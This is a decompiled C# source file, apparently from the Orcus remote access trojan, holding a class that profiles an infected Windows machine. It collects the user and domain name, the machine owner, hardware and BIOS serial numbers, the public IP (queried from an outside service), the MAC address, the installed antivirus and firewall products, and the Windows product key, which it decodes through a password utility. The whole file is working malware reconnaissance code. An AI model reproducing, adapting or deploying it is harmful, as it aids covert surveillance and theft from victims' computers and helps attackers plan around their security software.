using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.Win32;
using Orcus.Commands.Passwords.Utilities;
using Orcus.Extensions;
using Orcus.Shared.Commands.ComputerInformation;
using Orcus.Utilities;

namespace Orcus.Commands.ComputerInformation;

internal static class InformationCollector
{
	private delegate T GetValue<out T>();

	public static ComputerInformation GetInformation()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Expected O, but got Unknown
		Stopwatch stopwatch = Stopwatch.StartNew();
		ComputerInformation val = new ComputerInformation();
		val.set_SystemInformation(GetOperatingSystemInformation());
		val.set_HardwareInformation(GetHardwareInformation());
		val.set_NetworkInformation(GetNetworkInformation());
		val.set_BiosInformation(GetBiosInformation());
		val.set_SoftwareInformation(GetSoftwareInformation());
		val.set_LogicalDrives(GetLogicalDrives());
		val.set_ProcessTime((int)stopwatch.ElapsedMilliseconds);
		val.set_Timestamp(DateTime.UtcNow);
		return val;
	}

	private static List<LogicalDrive> GetLogicalDrives()
	{
		return ((IEnumerable<DriveInfo>)DriveInfo.GetDrives()).Select((Func<DriveInfo, LogicalDrive>)delegate(DriveInfo x)
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_0020: Unknown result type (might be due to invalid IL or missing references)
			//IL_003b: Expected O, but got Unknown
			//IL_003b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0040: Unknown result type (might be due to invalid IL or missing references)
			//IL_004c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0058: Unknown result type (might be due to invalid IL or missing references)
			//IL_0064: Unknown result type (might be due to invalid IL or missing references)
			//IL_007e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0085: Unknown result type (might be due to invalid IL or missing references)
			//IL_0096: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
			//IL_00af: Expected O, but got Unknown
			if (x.IsReady)
			{
				LogicalDrive val = new LogicalDrive();
				val.set_Name(x.Name);
				val.set_AvailableFreeSpace(x.AvailableFreeSpace);
				val.set_DriveFormat(x.DriveFormat);
				val.set_DriveType(x.DriveType.ToString());
				val.set_IsReady(true);
				val.set_RootDirectory(x.RootDirectory.FullName);
				val.set_TotalSize(x.TotalSize);
				val.set_VolumeLabel(x.VolumeLabel);
				return val;
			}
			LogicalDrive val2 = new LogicalDrive();
			val2.set_IsReady(false);
			val2.set_Name(x.Name);
			val2.set_DriveType(x.DriveType.ToString());
			return val2;
		}).ToList();
	}

	private static OperatingSystemInformation GetOperatingSystemInformation()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_0088: Expected I4, but got Unknown
		//IL_03a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ac: Expected O, but got Unknown
		OperatingSystemInformation val = new OperatingSystemInformation();
		val.set_NtVersion(Environment.OSVersion.ToString());
		val.set_Platform(Environment.OSVersion.Platform.ToString());
		val.set_SystemDirectory(Environment.SystemDirectory);
		val.set_ClrVersion(Environment.Version.ToString());
		val.set_UserName(Environment.UserName);
		val.set_UserDomainName(Environment.UserDomainName);
		val.set_SystemPageSize(EnvironmentExtensions.SystemPageSize);
		OperatingSystemInformation val2 = val;
		BootMode bootMode = SystemInformation.get_BootMode();
		switch ((int)bootMode)
		{
		default:
			val2.set_BootMode("N/A");
			break;
		case 0:
			val2.set_BootMode("Normal");
			break;
		case 1:
			val2.set_BootMode("Safe mode without network support");
			break;
		case 2:
			val2.set_BootMode("Safe mode with network support");
			break;
		}
		RegistryKey regKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", RegistryKeyPermissionCheck.ReadSubTree);
		try
		{
			val2.set_FriendlyName(SetValue(() => (string)regKey.GetValue("ProductName")));
			try
			{
				if (val2.get_FriendlyName().StartsWith("Windows 10"))
				{
					int num = int.Parse(regKey.GetValue("CurrentBuild")!.ToString());
					if (num < 10586)
					{
						val2.set_Version(string.Concat(regKey.GetValue("CurrentMajorVersionNumber"), ".", regKey.GetValue("CurrentMinorVersionNumber"), " [Build ", num, "]"));
					}
					else
					{
						val2.set_Version(string.Concat(regKey.GetValue("ReleaseId"), " [Build ", num, ".", regKey.GetValue("UBR"), "]"));
					}
				}
				else
				{
					val2.set_Version(string.Concat(regKey.GetValue("CurrentVersion"), " [Build ", regKey.GetValue("CurrentBuild"), "]"));
				}
			}
			catch (Exception)
			{
				val2.set_Version("N/A");
			}
			Match match = Regex.Match(val2.get_Version(), "^[0-9](\\.[0-9]{1,3})?");
			if (match.Success)
			{
				double num2 = double.Parse(match.Value, CultureInfo.InvariantCulture);
				if (num2 == 5.1)
				{
					val2.set_InternalName("Whistler");
				}
				else if (num2 == 5.2)
				{
					val2.set_InternalName("Whistler Server");
				}
				else if (num2 == 6.0)
				{
					if (val2.get_Version().Contains("Vista"))
					{
						val2.set_InternalName("Longhorn");
					}
					else if (val2.get_Version().Contains("2008"))
					{
						val2.set_InternalName("Longhorn Server");
					}
				}
				else if (num2 == 6.1)
				{
					val2.set_InternalName("Blackcomb, Vienna");
				}
				else if (num2 != 6.2 && num2 != 6.3)
				{
					if (num2 == 6.4 || num2 == 10.0 || val2.get_FriendlyName().StartsWith("Windows 10"))
					{
						val2.set_InternalName("Threshold");
					}
				}
				else
				{
					val2.set_InternalName("Mystic, Orient");
				}
			}
			if (string.IsNullOrEmpty(val2.get_InternalName()))
			{
				val2.set_InternalName("N/A");
			}
		}
		finally
		{
			if (regKey != null)
			{
				((IDisposable)regKey).Dispose();
			}
		}
		ManagementObjectSearcher val3 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_ComputerSystem");
		try
		{
			ManagementObject computerSystemManagmentObject = ((IEnumerable)val3.Get()).OfType<ManagementObject>().FirstOrDefault();
			try
			{
				val2.set_Architecture(SetValue(() => (string)((ManagementBaseObject)computerSystemManagmentObject).get_Item("SystemType")));
				val2.set_AdminPasswordStatus(SetValue(() => AdminPasswordStatusToString(int.Parse(((ManagementBaseObject)computerSystemManagmentObject).get_Item("AdminPasswordStatus").ToString()))));
				val2.set_Workgroup(SetValue(() => (string)((ManagementBaseObject)computerSystemManagmentObject).get_Item("Workgroup")));
				val2.set_Manufacturer(SetValue(() => (string)((ManagementBaseObject)computerSystemManagmentObject).get_Item("Manufacturer")));
				val2.set_Model(SetValue(() => (string)((ManagementBaseObject)computerSystemManagmentObject).get_Item("Model")));
				val2.set_Owner(SetValue(() => (string)((ManagementBaseObject)computerSystemManagmentObject).get_Item("PrimaryOwnerName")));
				val2.set_TotalPhysicalMemory(SetValue(() => (ulong)((ManagementBaseObject)computerSystemManagmentObject).get_Item("TotalPhysicalMemory"), 0uL));
			}
			finally
			{
				if (computerSystemManagmentObject != null)
				{
					((IDisposable)computerSystemManagmentObject).Dispose();
				}
			}
		}
		finally
		{
			((IDisposable)val3)?.Dispose();
		}
		val2.set_ProductKey(SetValue(KeyDecoder.GetWindowsProductKey));
		return val2;
	}

	private static BiosInformation GetBiosInformation()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		BiosInformation val = new BiosInformation();
		ManagementObjectSearcher val2 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_BIOS");
		try
		{
			ManagementObject biosManagmentObject = ((IEnumerable)val2.Get()).OfType<ManagementObject>().FirstOrDefault();
			try
			{
				val.set_Name(SetValue(() => (string)((ManagementBaseObject)biosManagmentObject).get_Item("Name")));
				val.set_Version(SetValue(() => (string)((ManagementBaseObject)biosManagmentObject).get_Item("Version")));
				val.set_ProductId(SetValue(() => (string)((ManagementBaseObject)biosManagmentObject).get_Item("SerialNumber")));
				val.set_Manufacturer(SetValue(() => (string)((ManagementBaseObject)biosManagmentObject).get_Item("Manufacturer")));
				val.set_ReleaseDate(SetValue(() => ManagementDateTimeConverter.ToDateTime((string)((ManagementBaseObject)biosManagmentObject).get_Item("ReleaseDate")), DateTime.MinValue));
				val.set_Language(SetValue(() => (string)((ManagementBaseObject)biosManagmentObject).get_Item("CurrentLanguage")));
				val.set_SupportedLanguages(SetValue(() => ((string[])((ManagementBaseObject)biosManagmentObject).get_Item("ListOfLanguages")).Aggregate(new StringBuilder(), (StringBuilder builder, string s) => builder.Append(s + ", ")).ToString().TrimEnd(' ', ',')));
				return val;
			}
			finally
			{
				if (biosManagmentObject != null)
				{
					((IDisposable)biosManagmentObject).Dispose();
				}
			}
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
	}

	private static HardwareInformation GetHardwareInformation()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		//IL_00a6: Expected O, but got Unknown
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_020e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0215: Expected O, but got Unknown
		//IL_0230: Unknown result type (might be due to invalid IL or missing references)
		//IL_0235: Unknown result type (might be due to invalid IL or missing references)
		//IL_0251: Unknown result type (might be due to invalid IL or missing references)
		//IL_0268: Unknown result type (might be due to invalid IL or missing references)
		//IL_027f: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f4: Expected O, but got Unknown
		//IL_0306: Unknown result type (might be due to invalid IL or missing references)
		//IL_030b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0312: Unknown result type (might be due to invalid IL or missing references)
		//IL_031d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0328: Unknown result type (might be due to invalid IL or missing references)
		//IL_0333: Unknown result type (might be due to invalid IL or missing references)
		//IL_033e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0349: Unknown result type (might be due to invalid IL or missing references)
		//IL_0359: Expected O, but got Unknown
		HardwareInformation val = new HardwareInformation();
		val.set_Screens(((IEnumerable<Screen>)Screen.get_AllScreens()).Select((Func<Screen, Screen>)delegate(Screen x)
		{
			//IL_0000: Unknown result type (might be due to invalid IL or missing references)
			//IL_0005: Unknown result type (might be due to invalid IL or missing references)
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_0047: Unknown result type (might be due to invalid IL or missing references)
			//IL_0053: Unknown result type (might be due to invalid IL or missing references)
			//IL_0060: Expected O, but got Unknown
			Screen val10 = new Screen();
			val10.set_IsPrimary(x.get_Primary());
			val10.set_Resolution($"{x.get_Bounds().Width} x {x.get_Bounds().Height}");
			val10.set_BitsPerPixel(x.get_BitsPerPixel());
			val10.set_DeviceName(x.get_DeviceName());
			return val10;
		}).ToList());
		HardwareInformation val2 = val;
		ProcessorInfo val3 = new ProcessorInfo();
		val3.set_LogicalProcessors(Environment.ProcessorCount);
		val3.set_ClockSpeed(SetValue(delegate
		{
			using RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", RegistryKeyPermissionCheck.ReadSubTree);
			string text = registryKey2.GetValue("~MHz")!.ToString();
			return Math.Round(Convert.ToDecimal(text) / 1000m) + " GHz (" + text + " MHz)";
		}));
		val3.set_ManufactureId(SetValue(delegate
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", RegistryKeyPermissionCheck.ReadSubTree);
			return registryKey.GetValue("VendorIdentifier")!.ToString();
		}));
		ProcessorInfo val4 = val3;
		val2.set_ProcessorInfo(val3);
		try
		{
			ManagementObjectSearcher val5 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
			try
			{
				ManagementObject processorManagementObject = ((IEnumerable)val5.Get()).OfType<ManagementObject>().FirstOrDefault();
				try
				{
					if (processorManagementObject != null)
					{
						val4.set_Name(SetValue(() => ((ManagementBaseObject)processorManagementObject).get_Item("Name").ToString()));
						val4.set_Description(SetValue(() => ((ManagementBaseObject)processorManagementObject).get_Item("Description").ToString()));
						val4.set_Cores(SetValue(() => (uint)((ManagementBaseObject)processorManagementObject).get_Item("NumberOfCores"), 0u));
						val4.set_Architecture(SetValue(() => ArchitectureToString(int.Parse(((ManagementBaseObject)processorManagementObject).get_Item("Architecture").ToString()))));
						val4.set_L2CacheSize(SetValue(() => string.Concat(((ManagementBaseObject)processorManagementObject).get_Item("L2CacheSize"), "KiB")));
						val4.set_L3CacheSize(SetValue(() => string.Concat(((ManagementBaseObject)processorManagementObject).get_Item("L3CacheSize"), "KiB")));
						val4.set_DeviceId(SetValue(() => ((ManagementBaseObject)processorManagementObject).get_Item("DeviceID").ToString()));
						val4.set_ProcessorId(SetValue(() => ((ManagementBaseObject)processorManagementObject).get_Item("ProcessorId").ToString()));
						val4.set_ProcessorType(SetValue(() => ProcessorTypeToString(int.Parse(((ManagementBaseObject)processorManagementObject).get_Item("ProcessorType").ToString()))));
						val4.set_ExternalClockSpeed(SetValue(() => string.Concat(((ManagementBaseObject)processorManagementObject).get_Item("ExtClock"), "MHz")));
						val4.set_Revision(SetValue(() => int.Parse(((ManagementBaseObject)processorManagementObject).get_Item("Revision").ToString()), 0));
					}
				}
				finally
				{
					if (processorManagementObject != null)
					{
						((IDisposable)processorManagementObject).Dispose();
					}
				}
			}
			finally
			{
				((IDisposable)val5)?.Dispose();
			}
		}
		catch (Exception)
		{
		}
		try
		{
			ManagementObjectSearcher val6 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
			try
			{
				ManagementObject val7 = ((IEnumerable)val6.Get()).OfType<ManagementObject>().FirstOrDefault();
				if (val7 != null)
				{
					VideoCardInfo val8 = new VideoCardInfo();
					val8.set_MaxRefreshRate(int.Parse(((ManagementBaseObject)val7).get_Item("MaxRefreshRate").ToString()));
					val8.set_DeviceId(((ManagementBaseObject)val7).get_Item("DeviceID").ToString());
					val8.set_Name(((ManagementBaseObject)val7).get_Item("Caption").ToString());
					val8.set_VideoArchitecture(VideoArchitectureToString(int.Parse(((ManagementBaseObject)val7).get_Item("VideoArchitecture").ToString())));
					val8.set_VideoMemoryType(VideoMemoryTypeToString(int.Parse(((ManagementBaseObject)val7).get_Item("VideoMemoryType").ToString())));
					val8.set_VideoModeDescription(((ManagementBaseObject)val7).get_Item("VideoModeDescription").ToString());
					val8.set_VideoProcessor(((ManagementBaseObject)val7).get_Item("VideoProcessor").ToString());
					val2.set_VideoCardInfo(val8);
					return val2;
				}
				return val2;
			}
			finally
			{
				((IDisposable)val6)?.Dispose();
			}
		}
		catch (Exception)
		{
			VideoCardInfo val9 = new VideoCardInfo();
			val9.set_MaxRefreshRate(-1);
			val9.set_DeviceId("N/A");
			val9.set_Name("N/A");
			val9.set_VideoArchitecture("N/A");
			val9.set_VideoMemoryType("N/A");
			val9.set_VideoModeDescription("N/A");
			val9.set_VideoProcessor("N/A");
			val2.set_VideoCardInfo(val9);
			return val2;
		}
	}

	private static T SetValue<T>(GetValue<T> action, T defaultValue)
	{
		try
		{
			return action();
		}
		catch (Exception)
		{
			return defaultValue;
		}
	}

	private static string SetValue(GetValue<string> action)
	{
		string text = SetValue(action, "N/A");
		if (!string.IsNullOrEmpty(text))
		{
			return text;
		}
		return "N/A";
	}

	private static NetworkInformation GetNetworkInformation()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Expected O, but got Unknown
		NetworkInformation val = new NetworkInformation();
		val.set_IpAddresses(((IEnumerable<IPAddress>)Dns.GetHostEntry(Dns.GetHostName()).AddressList).Select((Func<IPAddress, IpAddress>)delegate(IPAddress x)
		{
			//IL_0000: Unknown result type (might be due to invalid IL or missing references)
			//IL_0005: Unknown result type (might be due to invalid IL or missing references)
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_001e: Expected O, but got Unknown
			IpAddress val3 = new IpAddress();
			val3.set_AddressFamily(x.AddressFamily);
			val3.set_Value(x.ToString());
			return val3;
		}).ToList());
		NetworkInformation val2 = val;
		using (WebClient webClient = new WebClient
		{
			Proxy = null
		})
		{
			try
			{
				val2.set_PublicIp(webClient.DownloadString("https://api.ipify.org/"));
			}
			catch (WebException)
			{
				val2.set_PublicIp("N/A");
			}
		}
		val2.set_MacAddress("N/A");
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		foreach (NetworkInterface networkInterface in allNetworkInterfaces)
		{
			if (networkInterface.NetworkInterfaceType != NetworkInterfaceType.Wireless80211 && (networkInterface.NetworkInterfaceType != NetworkInterfaceType.Ethernet || networkInterface.OperationalStatus != OperationalStatus.Up))
			{
				continue;
			}
			bool flag = false;
			foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
			{
				if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork && unicastAddress.AddressPreferredLifetime != 4294967295L)
				{
					flag = unicastAddress.Address.ToString() == GetLanIp();
				}
			}
			if (flag)
			{
				string text = networkInterface.GetPhysicalAddress().ToString();
				val2.set_MacAddress((text.Length != 12) ? "00:00:00:00:00:00" : Regex.Replace(text, "(.{2})(.{2})(.{2})(.{2})(.{2})(.{2})", "$1:$2:$3:$4:$5:$6"));
				break;
			}
		}
		return val2;
	}

	private static SoftwareInformation GetSoftwareInformation()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		SoftwareInformation val = new SoftwareInformation();
		try
		{
			ManagementObjectSearcher val2 = new ManagementObjectSearcher(CoreHelper.RunningOnVistaOrGreater ? "root\\SecurityCenter2" : "root\\SecurityCenter", "SELECT * FROM AntivirusProduct");
			string[] array;
			try
			{
				array = (from mObject in ((IEnumerable)val2.Get()).OfType<ManagementObject>()
					select ((ManagementBaseObject)mObject).get_Item("displayName").ToString()).ToArray();
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
			val.set_AntiVirusPrograms((array.Length != 0) ? string.Join(", ", array.ToArray()) : "N/A");
		}
		catch
		{
			val.set_AntiVirusPrograms("Unknown");
		}
		try
		{
			ManagementObjectSearcher val3 = new ManagementObjectSearcher(CoreHelper.RunningOnVistaOrGreater ? "root\\SecurityCenter2" : "root\\SecurityCenter", "SELECT * FROM FirewallProduct");
			string[] array2;
			try
			{
				array2 = (from mObject in ((IEnumerable)val3.Get()).OfType<ManagementObject>()
					select ((ManagementBaseObject)mObject).get_Item("displayName").ToString()).ToArray();
			}
			finally
			{
				((IDisposable)val3)?.Dispose();
			}
			val.set_Firewalls((array2.Length != 0) ? string.Join(", ", array2) : "N/A");
		}
		catch
		{
			val.set_Firewalls("Unknown");
		}
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
			val.set_InstalledPrograms((registryKey != null) ? registryKey.GetSubKeyNames().Length : (-1));
			return val;
		}
		catch (Exception)
		{
			val.set_InstalledPrograms(-1);
			return val;
		}
	}

	private static string ArchitectureToString(int value)
	{
		return value switch
		{
			0 => "x86", 
			1 => "MIPS", 
			2 => "Alpha", 
			3 => "PowerPC", 
			5 => "ARM", 
			6 => "Itanium-based systems", 
			9 => "x64", 
			_ => string.Empty, 
		};
	}

	private static string AdminPasswordStatusToString(int status)
	{
		return status switch
		{
			1 => "Disabled", 
			2 => "Enabled", 
			3 => "Not Implemented", 
			_ => "Unknown", 
		};
	}

	private static string ProcessorTypeToString(int type)
	{
		return type switch
		{
			1 => "Other", 
			2 => "Unknown", 
			3 => "Central Processor", 
			4 => "Math Processor", 
			5 => "DSP Processor", 
			6 => "Video Processor", 
			_ => string.Empty, 
		};
	}

	private static string VideoArchitectureToString(int type)
	{
		return type switch
		{
			160 => "PC-98", 
			1 => "Other", 
			3 => "CGA", 
			4 => "EGA", 
			5 => "VGA", 
			6 => "SVGA", 
			7 => "MDA", 
			8 => "HGC", 
			9 => "MCGA", 
			10 => "8514A", 
			11 => "XGA", 
			12 => "Linear Frame Buffer", 
			_ => "Unknown", 
		};
	}

	private static string VideoMemoryTypeToString(int type)
	{
		return type switch
		{
			1 => "Other", 
			3 => "VRAM", 
			4 => "DRAM", 
			5 => "SRAM", 
			6 => "WRAM", 
			7 => "EDO RAM", 
			8 => "Burst Synchronous DRAM", 
			9 => "Pipelined Burst SRAM", 
			10 => "CDRAM", 
			11 => "3DRAM", 
			12 => "SDRAM", 
			13 => "SGRAM", 
			_ => "Unknown", 
		};
	}

	private static string GetLanIp()
	{
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		foreach (NetworkInterface networkInterface in allNetworkInterfaces)
		{
			if (networkInterface.NetworkInterfaceType != NetworkInterfaceType.Wireless80211 && (networkInterface.NetworkInterfaceType != NetworkInterfaceType.Ethernet || networkInterface.OperationalStatus != OperationalStatus.Up))
			{
				continue;
			}
			foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
			{
				if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork && unicastAddress.AddressPreferredLifetime != 4294967295L)
				{
					return unicastAddress.Address.ToString();
				}
			}
		}
		return "-";
	}
}
